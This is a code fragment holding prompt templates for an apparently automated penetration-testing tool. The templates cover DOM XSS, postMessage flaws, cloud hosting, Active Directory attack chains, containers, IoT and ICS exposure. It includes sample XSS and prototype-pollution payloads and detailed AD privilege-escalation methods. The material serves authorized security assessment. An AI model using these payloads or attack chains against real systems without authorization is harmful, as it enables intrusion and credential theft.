You are an expert web penetration tester specialising in client-side and JavaScript security. Analyze the device data below and identify EXPLOITABLE DOM-based and JavaScript-specific vulnerabilities.

## DEVICE DATA:
\$deviceJson

## SCOPE — DOM and JavaScript Attack Classes

### 1. DOM-Based XSS
Attacker objective: inject a payload into a DOM source that is written to a DOM sink without sanitization — bypassing server-side input validation and WAF rules entirely because the payload never reaches the server.

**DOM sources (attacker-controlled inputs):**
- `location.hash`, `location.search`, `location.href`, `location.pathname`
- `document.URL`, `document.documentURI`, `document.referrer`
- `window.name` (persists across page navigations — can be set from an attacker-controlled page that opens a window to the target)
- `postMessage` event data (covered separately below)
- Data retrieved from `localStorage` or `sessionStorage` that was originally populated from URL parameters

**DOM sinks (code execution points):**
- `innerHTML`, `outerHTML`, `insertAdjacentHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function(string)`
- jQuery: `\\\$(input)`, `.html(input)`, `.append(input)`, `.after(input)`, `.before(input)`
- `location.href = input` and `location.assign(input)` — execute `javascript:` URIs
- `src` and `href` attribute assignment on script/link elements

**Testing methodology:**
Inject `#"><img src=x onerror=alert(document.domain)>` into hash and search parameters and observe DOM changes. For `window.name`, open the target from an attacker-controlled page with a poisoned `window.name`. A payload that appears in the DOM without server reflection confirms a DOM XSS source/sink pair.

Evidence to require: SPA routing or hash-based navigation present; URL parameters that control displayed content or template rendering.
Severity: HIGH — DOM XSS enables session hijack and credential theft with no server-side trace.

### 2. postMessage Security Misconfigurations
Attacker objective: send a malicious message from an attacker-controlled origin to a vulnerable message event listener, triggering DOM manipulation, navigation, or data theft.

**Missing origin validation:**
`window.addEventListener('message', handler)` receives messages from ANY origin by default. If the handler does not check `event.origin` against a strict allowlist before acting on `event.data`, any attacker-controlled page can:
- Send a crafted message containing XSS payloads — if data is written to innerHTML, DOM XSS from cross-origin message. Severity: CRITICAL.
- Trigger navigation — if data is used in `location.href`, open redirect or `javascript:` URI execution. Severity: HIGH.
- Cause API calls or form submissions — CSRF-equivalent without a request from the victim browser. Severity: HIGH.
- Leak data back — if the handler replies with `event.source.postMessage(sensitiveData, '*')`, any listening origin receives it. Severity: HIGH.

**Insecure target origin in postMessage calls:**
`window.postMessage(data, '*')` broadcasts to any receiving origin. If the message contains authentication tokens or session data, any attacker-controlled page that opens a window to the target receives that data.
Evidence: JavaScript source containing `postMessage(` calls; inter-frame communication patterns; embedded third-party iframes.
Severity: MEDIUM for data disclosure; HIGH when authentication material is transmitted.

**iframe-based postMessage exploitation:**
Applications that embed content in iframes and communicate via postMessage are particularly exposed when:
- The parent page passes authentication tokens or configuration to an iframe that can be substituted with an attacker-controlled frame (via open redirect or permissive CSP frame-src)
- The embedded iframe origin is not strictly validated
Evidence: iframe usage; CSP frame-src allowing broad origins; third-party embed functionality.
Severity: HIGH when session material crosses the iframe boundary.

Evidence to generate findings: JavaScript SPA framework present; any observable inter-frame communication; SPA architecture with multiple views/routes.

### 3. Sensitive Data in JavaScript Source Files
Attacker objective: extract hardcoded credentials, API keys, internal endpoint URLs, or architectural information from publicly accessible JavaScript bundle files.

High-value targets in JavaScript source:
- Cloud provider credentials: AWS keys (`AKIA[A-Z0-9]{16}`), GCP service account JSON, Azure client secrets
- Third-party service keys: Stripe live keys (`sk_live_`, `pk_live_`), Twilio auth tokens, SendGrid/Mailchimp API keys
- Authentication secrets: JWT signing keys in client bundles (allows token forgery), OAuth client_secret (must never be in frontend code), internal API tokens
- Internal infrastructure: `localhost:`, RFC-1918 addresses, internal hostnames, staging/dev URLs revealing internal architecture
- GraphQL schema fragments, admin-only field names, or introspection queries embedded as comments or string literals
- Commented-out debug endpoints or test credentials left in production bundles

Testing methodology: fetch all observable `.js` bundle files and search for secret patterns. Modern bundlers (webpack, rollup, vite, esbuild) concatenate all application code — `main.[hash].js` or `vendor.[hash].js` often contains the entire frontend codebase.
Evidence: accessible JavaScript bundle paths visible in recon (`/static/js/`, `/_next/static/`, `/assets/`).
Severity: CRITICAL for cloud/auth credentials; HIGH for internal endpoint disclosure; MEDIUM for third-party service keys.

### 4. Client-Side Path Traversal in SPA Routing
Attacker objective: manipulate SPA router parameters to load unintended resources or bypass client-side authorization checks.

**Template/component path traversal:**
- Angular: `loadChildren` or route data constructed from URL parameters
- React: dynamic `import()` calls with user-controlled module paths
- Vue: dynamic component loading from route parameters

**Client-side authorization bypass:**
SPA route guards implemented in JavaScript that determine whether to render protected views can be bypassed by:
- Direct `history.pushState()` manipulation to navigate to protected routes
- Modifying authorization state in localStorage/sessionStorage
- Intercepting and modifying API responses that populate authorization state
Note: the real value is identifying the API endpoints exposed from protected views for server-side authorization testing.
Severity: MEDIUM — reveals protected endpoints; server-side authorization must be independently verified.

### 5. Client-Side Prototype Pollution via URL Parameters
Attacker objective: inject JavaScript properties into the global Object prototype via URL parameters, enabling authorization bypass or DOM XSS gadget chains.

URL-based pollution vectors:
- `?__proto__[foo]=bar` or `?constructor[prototype][foo]=bar` in apps that deep-merge URL parameters into objects
- Hash-based: `#__proto__[foo]=bar` parsed by SPA router
- JSON parameters: `?config={"__proto__":{"isAdmin":true}}` when query strings are JSON-parsed and merged

Severity: CRITICAL with a code execution gadget; HIGH for authorization bypass; MEDIUM for logic manipulation.
Evidence: SPA framework; URL parameters merged into application configuration objects.

## RULES:
- CONFIDENCE FLOOR: LOW when only framework indicators present. MEDIUM when SPA architecture confirmed and attack surface is plausible. HIGH when specific evidence (reflected hash content, accessible JS bundles, observable postMessage usage) is confirmed.
- Only fire for HTTP/HTTPS ports
- Do NOT generate for traditional server-rendered pages with no JavaScript framework indicators
- Each vulnerability class is a SEPARATE finding
- Credentials: only generate CRITICAL findings when a real secret key pattern or format is plausible given the technology stack — do NOT generate speculatively for all apps
''';

  /// Cloud & hosting infrastructure prompt (Phase 3.3).
  /// Fire condition: external target AND cloud/managed hosting detected from CNAME or HTTP headers.
  ///
  /// Intelligence source: CNAME chains, HTTP server headers, hosting platform indicators.
  /// Attacker objective: bypass CDN/WAF, exploit platform-specific misconfigurations.
  static String cloudHostingAnalysisPrompt(String deviceJson, {TargetScope scope = TargetScope.external}) {
    final isExternal = scope == TargetScope.external;
    final scopeContext = isExternal ? '''

## EXTERNAL SCOPE — FOCUS ON:
- SSRF to IMDS (requires SSRF vector on the application to reach 169.254.169.254)
- Subdomain takeover via cloud storage (dangling CNAME to unclaimed bucket/container)
- Publicly accessible storage buckets (no authentication required)
- Exposed serverless function URLs without authentication''' : '''

## INTERNAL SCOPE — FOCUS ON:
- IMDS direct access from the host (169.254.169.254 reachable without SSRF)
- Instance profile privilege abuse (what actions are permitted by the attached IAM role)
- Lateral movement to other cloud services using instance credentials
- Cloud metadata service credential extraction for cloud API access''';
    return '''
You are an expert in cloud and managed hosting security. Analyze the hosting infrastructure data below to identify attack vectors specific to the detected hosting platform.

## DEVICE DATA:
$deviceJson$scopeContext

## ANALYSIS AREAS:

### 1. Origin Server Bypass
Can the origin server be reached directly, bypassing any CDN/WAF layer?
- Identify any IPs not in known CDN ranges (Cloudflare: 104.x, 172.64-68.x; Fastly: 151.101.x; Akamai: known ranges)
- SPF "ip4:" addresses are often the origin mail/web server
- Historical DNS, certificate transparency logs, and alternative subdomains may reveal the origin
- If origin IP is reachable: direct exploitation of server software is possible without WAF filtering

### 2. Platform-Specific Misconfigurations
Based on the detected hosting platform, identify common misconfigurations:
- **WPEngine**: backup files at /_wpeprivate/, debug logs, staging environment exposure
- **Netlify**: _redirects file accessible, environment variable leakage in deploy logs, Netlify Forms spam
- **Vercel**: .vercel/output/ path exposure, environment variables in client-side bundles
- **GitHub Pages**: source repository enumeration, CNAME misconfiguration
- **AWS S3 + CloudFront**: S3 bucket direct access, ListBucket enabled, bucket policy misconfigurations
- **Azure Static Web Apps**: API backend exposure, SWA configuration file at /staticwebapp.config.json

### 3. Subdomain Takeover
Dangling CNAMEs to hosting platforms that may be unclaimed:
- If CNAME points to a platform subdomain and the content cannot be verified, flag for takeover testing
- Unclaimed GitHub Pages, Heroku apps, S3 buckets, Azure blob storage endpoints

### 4. CDN Cache Poisoning
Headers and URL patterns that could poison CDN caches for other users:
- Unkeyed headers (X-Forwarded-Host, X-Host, X-Original-URL) that affect response content
- Path normalization differences between CDN and origin
- Web cache deception: static file extensions on dynamic paths

### 5. Shared Hosting Risks
If target is on shared hosting:
- Cross-tenant file access via path traversal
- Shared database credentials in configuration files
- PHP open_basedir bypass potential

### 6. Serverless / Cloud Function Exposure
When function-as-a-service platform indicators are present (function URL patterns, serverless framework headers, or known FaaS endpoint patterns):
- **Unauthenticated function URL access:** Cloud function platforms allow direct HTTP invocation via a public URL. If authentication is not configured on the function URL, any caller can invoke the function. Evidence: function URL patterns in recon data (`.lambda-url.`, `.cloudfunctions.net`, `.azurewebsites.net`, `.on.aws`); HTTP responses from function-style endpoints. Severity: HIGH to CRITICAL depending on what the function does — functions with backend database or cloud API access are CRITICAL.
- **Environment variable credential disclosure:** Cloud functions receive secrets via environment variables at runtime. If the function has any code execution path (command injection, SSTI, path traversal to process environment) or if error messages include environment context, cloud credentials and API keys are directly exposed. Evidence: function endpoint present; any injection surface in function input; verbose error messages. Severity: CRITICAL.
- **IAM role over-permission from function context:** Functions execute with an attached cloud IAM role. If that role has permissions beyond the function's stated purpose, compromising the function yields cloud account capabilities far exceeding the function's scope. Evidence: function platform detected; cloud metadata service reachable from function context (169.254.169.254 or equivalent). Severity: HIGH to CRITICAL depending on role permissions.
- **Event source injection:** Functions that process user-controlled input from API Gateway, message queues, or storage triggers without sanitization are vulnerable to injection through the event data. Evidence: event-driven function architecture identifiable from endpoint patterns, trigger-based invocation indicators, or function response structures. Severity: HIGH.
- **Function-to-function trust exploitation:** In multi-function architectures, a compromised function may invoke other internal functions using its own identity without those functions validating the caller. Evidence: multiple function endpoints on the same domain or AWS account; shared IAM role or service account indicators. Severity: HIGH.
Evidence to look for: serverless platform domains in CNAME or response headers, function URL patterns, API Gateway indicators (execute-api.amazonaws.com, gateway.azure.com), serverless framework response headers.

## RULES:
- Only generate findings relevant to the detected hosting platform
- Do NOT generate generic web app findings (covered by the web app prompt)
- vulnerabilityType for origin bypass: "Info Disclosure" or "Config Weakness"
- vulnerabilityType for subdomain takeover: "Config Weakness"
- Severity for confirmed dangling CNAME (takeover possible): HIGH
- Severity for origin IP exposure: MEDIUM

''';
  }

  // ---------------------------------------------------------------------------
  // AD analysis — merged comprehensive prompt (was three separate prompts)
  // ---------------------------------------------------------------------------

  /// Comprehensive AD analysis — credential collection, privilege escalation, and lateral movement.
  /// Fire condition: AD indicators detected (ports 88, 389, 636, 445 with domain context).
  static String adComprehensivePrompt(String deviceJson, {TargetScope scope = TargetScope.internal, bool hasCrossForest = false}) {
    final isExternal = scope == TargetScope.external;
    final externalNote = isExternal ? '''

## INTERNET-EXPOSED AD — SEVERITY ESCALATION:
AD services on public internet. Escalate ALL findings by one severity level:
- Password spraying/AS-REP Roasting/Kerberoasting over internet-facing Kerberos: CRITICAL
- LDAP null bind on internet-facing DC: HIGH to CRITICAL''' : '';
    final crossForestBlock = hasCrossForest ? '''

### Cross-Forest Trust Abuse
Attacker objective: move from compromised forest into trusted forest.
- **SID History Injection:** If SID filtering disabled on trust, forge cross-realm TGT with privileged SID from target forest in sIDHistory. Evidence: inter-forest trust, SID filtering status. Severity: CRITICAL.
- **Trust Ticket Forging:** With both forests' trust keys (via DCSync), forge inter-realm TGT for persistent cross-forest access. Severity: CRITICAL.
- **Cross-forest constrained delegation:** msDS-AllowedToDelegateTo targeting services in trusted forest enables impersonation across boundary. Severity: HIGH.
- **Foreign Security Principals (FSPs):** Accounts from trusted forest in privileged groups (CN=ForeignSecurityPrincipals) — compromise source account to gain target forest privileges. Severity: HIGH.
- **Selective Authentication Bypass:** Misconfigured computer objects granting "Allowed to Authenticate" to Domain Users effectively disables selective auth. Severity: HIGH.
''' : '';
    return '''
You are an expert Active Directory penetration tester. Analyze the device data below and identify the full AD attack chain: initial access, credential collection, privilege escalation to Domain Admin, and lateral movement.

## DEVICE DATA:
$deviceJson$externalNote

---
## PHASE A: INITIAL ACCESS & CREDENTIAL COLLECTION

### Password Policy Enumeration (MANDATORY FIRST)
Determine lockout threshold, observation window, and duration before any credential testing.
- No lockout: CRITICAL (unlimited brute force). Threshold ≥ 10: HIGH. Threshold 5–9: HIGH. Threshold ≤ 4: HIGH (conservative cadence).
- Note Fine-grained PSOs that may override default policy for service/privileged accounts.
- Safe spray rule: one password per account per observation window, never more than (threshold - 1) attempts per window.

### LDAP Null Bind
Enumerate domain objects without credentials via LDAP (389) / LDAPS (636). Default on many DCs. Severity: HIGH.

### Password Spraying
One password across all accounts without triggering lockout. Common patterns: seasonal (Spring2024!), company name variants, keyboard walks. Severity: MEDIUM; HIGH if no lockout.

### AS-REP Roasting
Offline-crackable hashes for accounts without pre-authentication — no credentials needed. Severity: HIGH.

### Kerberoasting
Offline-crackable service ticket hashes using any valid domain account. Evidence: SPNs visible or LDAP accessible. Severity: MEDIUM-HIGH.

### GPP Credential Exposure
Cleartext credentials in Group Policy Preference XML files in SYSVOL — readable by all domain users. Severity: CRITICAL if recovered; HIGH as testing recommendation.

---
## PHASE B: PRIVILEGE ESCALATION (initial access → Domain Admin)

### ADCS Certificate Misconfigurations (ESC1–ESC8)
Exploit misconfigured certificate templates or CA settings for Domain Admin authentication via PKINIT.
- ESC1: enrollee specifies SAN → DA certificate. EDITF_ATTRIBUTESUBJECTALTNAME2 flag: equivalent for all templates.
- Web enrollment with NTLM auth (/certsrv): relay to CA yields certificate for any account.
- Overly permissive enrollment: Authenticated Users / Domain Users can enroll for high-privilege certs.
Severity: CRITICAL. Generate for any confirmed CA presence.

### ACL / DACL Abuse
Excessive permissions on AD objects: GenericAll (reset password), GenericWrite (add SPNs/modify logon script), WriteDACL (grant GenericAll), ForceChangePassword, GenericAll on computer (configure RBCD). Severity: MEDIUM-CRITICAL.

### Kerberos Delegation
- Unconstrained (TrustedForDelegation): authenticating users leave TGT. Severity: CRITICAL.
- Constrained with protocol transition: impersonate any user to specified services. Severity: HIGH-CRITICAL.
- RBCD: write access to computer object → configure impersonation. Severity: HIGH.

### Shadow Credentials
Add attacker RSA key to msDS-KeyCredentialLink → PKINIT auth as target without password. Requires Server 2016+. Severity: HIGH.

### LAPS Credential Exposure
Read local admin passwords from ms-Mcs-AdmPwd attribute. Severity: CRITICAL if readable.

### DCSync
Simulate DC replication to extract all domain hashes including krbtgt (Golden Ticket). Evidence: non-DC accounts with Replicating Directory Changes + All permissions. Severity: CRITICAL.

---
## PHASE C: LATERAL MOVEMENT & NETWORK ATTACKS

### SMB Relay / LLMNR-NBNS Poisoning
Poison name resolution → capture NTLM auth → relay to hosts without SMB signing → code execution. Severity: CRITICAL if SMB signing disabled.

### Pass-the-Hash / Pass-the-Ticket
Use captured NTLM hashes or Kerberos tickets directly for authentication. Severity: HIGH; CRITICAL for DA hashes.

### Netlogon Authentication Bypass
Cryptographic flaw in Netlogon handshake → unauthenticated domain takeover. Evidence: DC identified, SMB/RPC accessible. Severity: CRITICAL.

### Print Spooler Exploitation
Escalate to SYSTEM on any Windows host; on DC → domain takeover via forced auth coercion. Severity: HIGH on members; CRITICAL on DCs.

### WinRM / WMI Lateral Movement
WinRM (5985/5986): interactive PowerShell with valid credential. WMI over DCOM (135): command execution trusted by security tooling. Severity: HIGH; CRITICAL if externally accessible.
$crossForestBlock
## RULES:
- CONFIDENCE FLOOR: LOW without observed evidence; MEDIUM requires AD port/service observed; HIGH requires specific attribute/indicator
- Generate SEPARATE findings for each attack path
- ADCS findings: HIGH confidence when CA is present
- attackVector: ADJACENT for internal; NETWORK for internet-facing DC
- Do NOT generate web, CVE, or non-AD findings

''';
  }

  /// Phase 26: BloodHound-style AD attack path reasoning prompt.
  /// Fires as a second pass when ≥2 HIGH/CRITICAL AD-type findings exist.
  static String adAttackPathReasoningPrompt(String deviceJson, List<Vulnerability> priorAdFindings) {
    final findingsBlock = priorAdFindings.map((f) =>
        '  - [${f.severity}/${f.confidence}] ${f.problem}: ${f.evidence}').join('\n');
    return '''
You are an expert Active Directory penetration tester with BloodHound attack-path analysis experience. Using the prior AD findings below AND the device data, reason through multi-step privilege escalation chains from any foothold to Domain Administrator.

## DEVICE DATA:
$deviceJson

## PRIOR AD FINDINGS (from initial analysis pass):
$findingsBlock

## YOUR TASK — construct attack chains:

### Step 1 — Categorise each prior finding into one of:
- INITIAL_ACCESS: hash captured, anonymous bind, default credential, unauthenticated endpoint
- LATERAL_MOVEMENT: relay-capable target, shared local admin, pass-the-hash surface, SMB signing disabled
- PRIVILEGE_ESCALATION: Kerberoastable SPN, unconstrained/constrained delegation, ADCS template, writable ACL, group membership chain, GenericAll/WriteDACL
- DOMAIN_DOMINANCE: DA credential, DCSync right, ADCS CA admin, Golden Ticket material, krbtgt hash

### Step 2 — Construct multi-step attack chains:
For each plausible path from lowest-privilege foothold to Domain Administrator, write the path as a numbered sequence. Each step MUST reference an observed finding from the input list. No hypothetical steps.

Example chain format:
(1) NTLMv2 hash captured via LLMNR poisoning for service account X →
(2) hash relayed to SMB on host Y (signing disabled) →
(3) local admin on Y; cached session for domain admin Z →
(4) dump Z credentials from memory → Domain Admin

### Step 3 — Mark the shortest viable path as the critical remediation priority.

### Step 4 — Detection difficulty per chain:
For each chain, note whether the steps generate observable Event Log entries (4768, 4769, 4624, 4648) or blend with legitimate traffic. This informs remediation priority.

## OUTPUT RULES:
- vulnerabilityType: "AttackChain"
- severity: highest severity of any component finding in the chain
- Put the full numbered chain in description
- evidence_quote must be an exact substring from one of the prior findings' evidence fields
- Generate one entry per distinct attack chain
- If no viable chain can be constructed from the observed findings, return an empty array []

''';
  }

  /// Container, Kubernetes, and CI/CD DevOps infrastructure analysis prompt.
  /// Fires when container orchestration or DevOps infrastructure ports/services are detected.
  static String containerDevopsAnalysisPrompt(String deviceJson) => '''
You are an expert penetration tester specializing in container and DevOps infrastructure security. Analyze the device data below and identify attack paths against container runtimes, orchestration platforms, CI/CD systems, and related infrastructure.

## DEVICE DATA:
$deviceJson

## ANALYSIS AREAS:

### Container Runtime Management API Exposure
**What to detect:** An unauthenticated container management API allows listing all running containers (including environment variables, mounted secrets, network configuration), creating new containers that mount the host filesystem, and executing commands in running containers — all yielding host-level code execution.
**Evidence to look for:** Docker API port (2375 unencrypted, 2376 TLS) open; API endpoints responding without authentication headers; container metadata visible in service banners.
**Generate this finding if:** Container management port is open and any banner or response indicates Docker or container runtime API.
**Severity:** CRITICAL — unauthenticated container API yields full host compromise.

### Kubernetes API Server Misconfiguration
**What to detect:** A Kubernetes API server accessible without valid bearer token or client certificate authentication allows creating arbitrary workloads, reading all cluster secrets (database credentials, API keys, TLS certs stored as Kubernetes secrets), and accessing etcd.
**Evidence to look for:** Kubernetes API server port (6443) open; responses to unauthenticated requests; cluster-admin role bound to system:anonymous or system:unauthenticated; overly permissive RBAC policies allowing wildcard resource access.
**Severity:** CRITICAL — unauthenticated Kubernetes API access yields full cluster compromise.

### etcd Distributed Store Exposure
**What to detect:** etcd stores all Kubernetes cluster state including every Kubernetes secret in cleartext. If accessible without client certificate authentication, it yields the entire cluster's credentials and configurations.
**Evidence to look for:** etcd ports (2379/2380) open; port responding to requests without mutual TLS; any banner identifying etcd.
**Severity:** CRITICAL — etcd access yields all cluster secrets in cleartext.

### Service Mesh Management Interface Exposure
**What to detect:** Service discovery and mesh tools (Consul, etc.) often default to no authentication on their management HTTP API. Access allows reading all registered services and their configurations (which often contain credentials), reading and writing key-value configuration data, and registering malicious services.
**Evidence to look for:** Consul HTTP API port (8500) or similar service mesh management port open; API responding to unauthenticated GET requests; service registration endpoints accessible.
**Severity:** HIGH — unauthenticated access to service mesh yields credentials and ability to redirect service traffic.

### CI/CD Platform Exposed Admin Interface
**What to detect:** Continuous integration platforms (Jenkins, TeamCity, etc.) expose script execution consoles intended for administrators. When accessible without authentication or with default credentials, these consoles execute arbitrary code on the CI/CD server, which typically has access to all source code, deployment credentials, cloud provider keys, and production environment access.
**Evidence to look for:** Jenkins (8080, 8443), TeamCity (8111), or similar CI/CD default ports open; admin console path accessible; login form present with no authentication bypass required; default credentials not changed.
**Severity:** CRITICAL — CI/CD code execution yields source code, all deployment credentials, and production access.

### Container Registry Exposure
**What to detect:** Private container registries without authentication expose proprietary container images, which may contain embedded secrets, credentials in image layers, and application source code.
**Evidence to look for:** Container registry port (5000) open; registry API responding to unauthenticated catalog requests (GET /v2/_catalog).
**Severity:** HIGH — unauthenticated registry access exposes proprietary images and potentially embedded credentials.

## RULES:
- Only generate findings for ports and services present in the device data
- Severity CRITICAL for: unauthenticated container API, unauthenticated K8s API, etcd without auth
- Severity HIGH for: CI/CD with default credentials, unauthenticated service mesh, exposed registry
- attackVector for all findings: NETWORK (these are remotely accessible management interfaces)
- Include specific test commands in descriptions — what would confirm the misconfiguration

''';

  /// IoT and embedded device security analysis prompt.
  /// Fires when IoT device indicators are detected in device data.
  static String iotDeviceAnalysisPrompt(String deviceJson) => '''
You are an expert penetration tester specializing in IoT and embedded device security. Analyze the device data below and identify attack paths against IoT devices, embedded systems, network equipment, cameras, and similar hardware.

## DEVICE DATA:
$deviceJson

## ANALYSIS AREAS:

### Default and Hardcoded Authentication Material
**What to detect:** IoT device families ship with well-documented default credentials that are rarely changed. Some devices have hardcoded credentials in firmware that cannot be changed via the management interface.
**Evidence to look for:** Device model, firmware version, or service banner identifying the device family. Management interfaces accessible via web (port 80/443), SSH (port 22), or Telnet (port 23). Any login prompt without evidence that non-default credentials are required.
**Generate this finding if:** The device family is identifiable from any recon signal. Research the device family for known default credential patterns — the model name and firmware version together identify the credential set.
**Severity:** CRITICAL if management access is achievable; HIGH if credential testing is indicated.

### Unencrypted Management Protocol (Telnet)
**What to detect:** Telnet access to embedded devices transmits all data including credentials in cleartext. Any Telnet-accessible management interface is a HIGH finding regardless of credential status.
**Evidence to look for:** Telnet port (23) open; service banner identifying an embedded device or network equipment.
**Severity:** HIGH — all credentials and commands transmitted in cleartext; network eavesdropping yields full management access.

### Unauthenticated MQTT Broker
**What to detect:** MQTT brokers accepting connections and subscriptions without authentication expose all IoT telemetry and command channels to any network-accessible client. A subscriber can read all sensor data; a publisher can send commands to actuators and control devices.
**Evidence to look for:** MQTT port (1883 unencrypted, 8883 TLS) open; broker accepting anonymous connections (CONNECT packet without credentials succeeds).
**Severity:** HIGH — unauthenticated MQTT access exposes device control and sensor data.

### Exposed Video Stream Access
**What to detect:** RTSP video streams and ONVIF camera management interfaces without authentication expose live video feeds. Management interfaces additionally allow modifying recording settings, accessing stored footage, and potentially executing commands via management protocol vulnerabilities.
**Evidence to look for:** RTSP port (554) open; ONVIF-related ports open; device identified as camera, DVR, or NVR from hostname, banner, or service data.
**Severity:** HIGH for unauthenticated video feed access; CRITICAL if command execution via management protocol is possible.

### Embedded Web Interface Vulnerabilities
**What to detect:** Embedded web interfaces are frequently built on stripped-down HTTP servers with minimal security testing history. Common findings include: authentication bypass via URL manipulation, command injection through diagnostic functions (ping, traceroute, firmware update), path traversal to read configuration files containing credentials, and CSRF on all management functions.
**Evidence to look for:** HTTP/HTTPS management interface present (port 80/443/8080/8443); device identified as network equipment, camera, printer, or similar embedded device.
**Severity:** CRITICAL for command injection (typically yields OS-level access); HIGH for authentication bypass; MEDIUM for CSRF on management functions.

### Firmware and Software Version Exposure
**What to detect:** When a device's firmware version is identifiable from service banners or response headers, compare against known vulnerability databases for that device family. Embedded devices are rarely patched and frequently run firmware versions years out of date.
**Evidence to look for:** Firmware version strings in service banners or HTTP headers; device model and version identifiable from any recon signal.
**Severity:** Depends on identified vulnerabilities — report as HIGH if critical unpatched vulnerabilities are known for the identified version.

## RULES:
- Focus on the device family and what attack patterns apply to it — embedded devices have well-known vulnerability patterns specific to their category
- Default credentials are almost always worth generating a finding for — the question is whether the device is identifiable
- Severity CRITICAL for: command execution, unauthenticated full device management access
- Severity HIGH for: Telnet cleartext, unauthenticated MQTT, unauthenticated video access, authentication bypass
- attackVector for all findings: NETWORK for remotely accessible ports; ADJACENT for protocols that require LAN access
- Do NOT generate findings for attack surfaces that have no evidence in the recon data

''';

  /// OT/SCADA/ICS protocol detection and exposure reporting prompt.
  /// Fires when industrial control system protocol ports are detected.
  /// NOTE: This prompt focuses on exposure identification, not active exploitation — OT systems can cause physical harm if actively attacked.
  static String otScadaAnalysisPrompt(String deviceJson, {TargetScope scope = TargetScope.internal}) {
    final externalEscalation = scope == TargetScope.external ? '''

## INTERNET-EXPOSED ICS — SEVERITY ESCALATION (CRITICAL):
This industrial control system is accessible from the public internet. ALL findings must be escalated to CRITICAL severity regardless of the specific vulnerability class.
Rationale: Internet-exposed industrial control systems represent an extreme risk — exploitation may result in physical damage, safety incidents, infrastructure disruption, or loss of life. No mitigation reduces the risk below CRITICAL while the system remains internet-accessible. Include this note in every finding's businessRisk field.''' : '';
    return '''
You are an expert industrial control system (ICS) security assessor. Analyze the device data below and identify operational technology (OT) protocol exposure and ICS security findings. Your objective is IDENTIFICATION AND EXPOSURE REPORTING — active exploitation of control systems can cause physical damage, process disruption, or safety hazards and must not be recommended without explicit client authorization and ICS-specific safety training.

## DEVICE DATA:
$deviceJson$externalEscalation

## ANALYSIS AREAS:

### Industrial Protocol Exposure
**What to detect:** Industrial control system protocols were designed for isolated networks and have no authentication — any device that can reach the protocol port can read all sensor values and write all control outputs.
**Protocols to identify and their severity:**
- Modbus (port 502): reads/writes coils and registers controlling physical processes — CRITICAL
- DNP3 (port 20000): power grid and water/utilities control protocol — CRITICAL
- EtherNet/IP / CIP (port 44818 TCP, 2222 UDP): industrial automation control — CRITICAL
- BACnet (port 47808 UDP): building management — HVAC, lighting, access control, fire suppression — HIGH
- Siemens S7 (port 102): Siemens PLC control protocol — CRITICAL
- IEC 60870-5-104 (port 2404): power system SCADA — CRITICAL
- OPC-UA (port 4840): unified industrial data exchange — HIGH if unauthenticated
- OPC-DA/DCOM (port 135 with OPC context): legacy industrial data access — HIGH
**Evidence to look for:** Any of the above ports open in the device data.
**Generate this finding if:** Any OT protocol port is detected.

### Engineering Workstation and HMI Dual-Homing
**What to detect:** Human-Machine Interface (HMI) workstations and SCADA engineering workstations often run Windows with standard IT remote access services (RDP, SMB, VNC) alongside industrial software. These are high-value lateral movement targets — access to the IT side of a dual-homed HMI can yield reach into the OT network.
**Evidence to look for:** Host showing both IT-standard services (RDP port 3389, SMB port 445, VNC port 5900) and OT protocol ports.
**Severity:** HIGH — dual-homed HMI is a pivot point from IT to OT network.

### Remote Access to Industrial Devices
**What to detect:** Any remote management access to a control system device (Telnet, vendor-specific remote access protocols, web management interface) is a CRITICAL finding — not because exploitation is recommended, but because the exposure represents the ability to alter physical processes.
**Evidence to look for:** Telnet (port 23) or any management web interface on a host also showing OT protocol ports.
**Severity:** CRITICAL — remote access to control system hardware.

### Passive vs Active Operation Classification (CRITICAL — read before testing)
For every detected OT protocol, operations are classified as either safe-to-observe (passive) or potentially disruptive (active/write). Only passive operations may be performed without explicit written authorization from both the security team AND the responsible engineering/operations team.

**Modbus (port 502):**
- PASSIVE (safe to attempt): Read Coil Status (FC1), Read Input Status (FC2), Read Holding Registers (FC3), Read Input Registers (FC4) — these read current device state without changing it.
- ACTIVE — DO NOT PERFORM without written ICS authorization: Write Single Coil (FC5), Write Single Register (FC6), Write Multiple Coils (FC15), Write Multiple Registers (FC16), Force Listen Only Mode (FC8) — these modify device state and can cause physical actuator movement.

**DNP3 (port 20000):**
- PASSIVE (safe to attempt): Read class data (Class 0/1/2/3 polls), device attribute read — these collect telemetry and device metadata.
- ACTIVE — DO NOT PERFORM: Control Relay Output Block (CROB), Analog Output command, Direct Operate, Select-Before-Operate — these issue commands that drive physical outputs.

**Siemens S7 (port 102):**
- PASSIVE (safe to attempt): CPU identification read, firmware version query, protection level query — these identify the device without changing state.
- ACTIVE — DO NOT PERFORM: Program upload/download, CPU mode change (RUN/STOP/HALT), write variable — any of these can halt production processes or cause equipment damage.

**EtherNet/IP / CIP (port 44818):**
- PASSIVE (safe to attempt): Identity Object read (List Identity), connection list query, forward open for read-only — these enumerate device identity and status.
- ACTIVE — DO NOT PERFORM: Output assembly write, service-specific objects modifying device parameters, forward open with write access.

**BACnet (port 47808 UDP):**
- PASSIVE (safe to attempt): Read-Property, Read-Property-Multiple, Who-Is broadcast — these enumerate device objects and property values without modification.
- ACTIVE — DO NOT PERFORM: Write-Property, Command procedures — these modify HVAC setpoints, access control settings, or fire system parameters.

**General rule for all OT protocols:** If unsure whether an operation is read-only, do not attempt it. The exposure itself (protocol accessible without authentication from a reachable network segment) is sufficient for a CRITICAL finding — exploitation is not required to establish risk.

### OT Protocol Scope and Safety Advisory
**Always generate this finding when any OT protocol is detected:** Include an advisory finding titled "Industrial Control System Protocol Detected — Safety Advisory" noting that:
- Active testing of industrial control systems is outside scope unless explicitly authorized in writing by both the security engagement owner AND the responsible engineering/operations team
- Testing must only be performed by testers with ICS-specific safety training — uncontrolled testing can cause physical damage, process failure, or harm to personnel
- Only passive read-only protocol operations (as classified above per protocol) may be performed without explicit ICS authorization
- Document the exposure and coordinate with the client's OT team before any active engagement
**Severity:** INFORMATIONAL — this is a scope and safety notice, not an exploitable finding.

## RULES:
- The primary purpose is to IDENTIFY and DOCUMENT exposure — the exposure of OT protocol ports to network-accessible segments is the finding, regardless of whether exploitation occurred
- ALWAYS include the safety advisory finding when any OT protocol is detected
- Do NOT recommend write, control, or command operations for control system protocols — only passive read operations are acceptable without explicit ICS authorization
- Do NOT recommend testing that could disrupt process operations
- attackVector for OT protocol findings: NETWORK (if reachable from the scanned network segment) or ADJACENT (if local network access required)
